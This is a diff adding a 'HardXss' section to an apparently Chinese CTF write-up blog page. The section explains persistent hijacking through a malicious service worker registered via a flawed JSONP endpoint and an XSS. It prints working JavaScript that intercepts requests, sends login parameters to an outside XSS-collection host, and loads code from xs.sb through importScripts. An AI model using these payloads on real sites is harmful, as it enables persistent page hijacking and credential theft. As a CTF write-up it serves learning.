@@ -82,7 +82,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.5k</span>
+            <span class="post-count">2.2k</span>
         </span>
     </span>
 
@@ -91,7 +91,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">6 min</span>
+            <span class="post-count">9 min</span>
         </span>
     </span>
 </div>
@@ -159,6 +159,26 @@
 <p>注意有效期只有一分钟，没有干到时间就要重打，然后就是这里特别容易因为网络原因而打失败，建议大家多打几次，因为环境基本上都是满足的，一般是不应该出现打不通的情况的。</p>
 <p>这样就是时间过了</p>
 <p><img src="https://i.loli.net/2020/10/13/if7vo2clgp5EZGJ.png"></p>
+<h2 id="三、HardXss"><a href="#三、HardXss" class="headerlink" title="三、HardXss"></a>三、HardXss</h2><p>大致理解的原理如下:</p>
+<p>观察源代码找到xss注入点，然后引用恶意的js代码进行xss注入，但是这道题的考察点不知道大佬们是怎么直接想到使用windows sever的api的这种骚操作的，我只会说一句，太骚了。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3228">https://xz.aliyun.com/t/3228</a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://120.25.156.28/posts/1.html">https://120.25.156.28/posts/1.html</a></p>
+<p>大概的概括就是 某个域利用 xxxx/aaa.js 注册了一个service worker之后 xxxx/目录的所有请求 都可以被aaa.js中的代码劫持和控制响应wtf? 还是持久化触发的，注册完以后 注册页面可以关闭。在service worker整个存活期间（很久很久） 页面都一直可以被劫持<br>但是注册service worker 也有很多苛刻的条件（为了安全）。</p>
+<p>条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存在有缺陷的 JSONP 接口</span><br><span class="line">JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</span><br><span class="line">JSONP 返回的 Content-Type 必须是 JS 类型</span><br><span class="line">存在 XSS 的页面</span><br></pre></td></tr></table></figure>
+
+<p><strong>JSONP 返回的 Content-Type 必须是 JS 类型</strong>可能这是突破口</p>
+<p>然后绕过js代码长度限制的方法就是引入外部的js：<code>callback=importScripts(&#39;//xlcxss.sinaapp.com/xss/sw.js&#39;);</code></p>
+<p>大致解题流程如下:</p>
+<p>1.查看页面源代码，找到题目的突破口</p>
+<p>2.本题的思路逻辑是：在登陆界面存在着xss注入，通过在这个界面的<code>document.domain</code>和jsonp来进行跨域操作，来在本地先进行对请求的hook，抓取请求中的账户名和密码（这个题是通过get请求进行验证的），在这里完成payload的构造后，再去向站长提交问题，注意这个URL的正确提交，后面带上callback进行xss注入，然后爆破验证码就可以了，最后查看账号密码进行登陆</p>
+<p>3.大骂一下啊，现在网上的alji免费xss平台，做的太拉垮，但是谁叫我没有vps呢？</p>
+<p>下面贴上代码，使用的是xs.sb平台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这是操作文件</span><br><span class="line">self.addEventListener(&#39;fetch&#39;, function (event) &#123;</span><br><span class="line">        console.log(event.request);</span><br><span class="line">        event.respondWith(</span><br><span class="line">        caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        return requestBackend(event);</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line">function requestBackend(event)&#123;</span><br><span class="line">        var url &#x3D; event.request.clone();</span><br><span class="line">        console.log(url);</span><br><span class="line">        return new Response(&quot;&lt;script&gt;var a &#x3D;location.search; a &#x3D;a.replace(&#39;?&#39;,&#39;&#39;);a&#x3D;a.replace(&#39;&amp;&#39;,&#39;&#39;);var b&#x3D;a.substring(0,a[&#39;length&#39;]&#x2F;2);var c&#x3D;a.substring(a[&#39;length&#39;]&#x2F;2,a[&#39;length&#39;]);location&#x3D;&#39;https:&#x2F;&#x2F;xsshs.cn&#x2F;xss.php?do&#x3D;api&amp;id&#x3D;pNII&amp;uin&#x3D;&#39;+b+&#39;&amp;skey&#x3D;&#39;+c;&lt;&#x2F;script&gt;&quot;, &#123;headers: &#123; &#39;Content-Type&#39;: &#39;text&#x2F;html&#39; &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">入口文件</span><br><span class="line">document.domain &#x3D; &quot;hardxss.xhlj.wetolink.com&quot;;</span><br><span class="line">var iff &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line">iff.src &#x3D; &#39;https:&#x2F;&#x2F;auth.hardxss.xhlj.wetolink.com&#x2F;&#39;;</span><br><span class="line">iff.addEventListener(&quot;load&quot;, function()&#123; iffLoadover(); &#125;);</span><br><span class="line">document.body.appendChild(iff);</span><br><span class="line">exp &#x3D; &#96;navigator.serviceWorker.register(&quot;&#x2F;api&#x2F;loginStatus?callback&#x3D;self.importScripts(&#39;&#x2F;&#x2F;xs.sb&#x2F;l6s9&#39;)&#x2F;&#x2F;&quot;)&#96;;</span><br><span class="line">function iffLoadover()&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>md5爆破文件就不上传了，感谢赵总，爱了爱了</p>
  
       <!-- reward -->
       
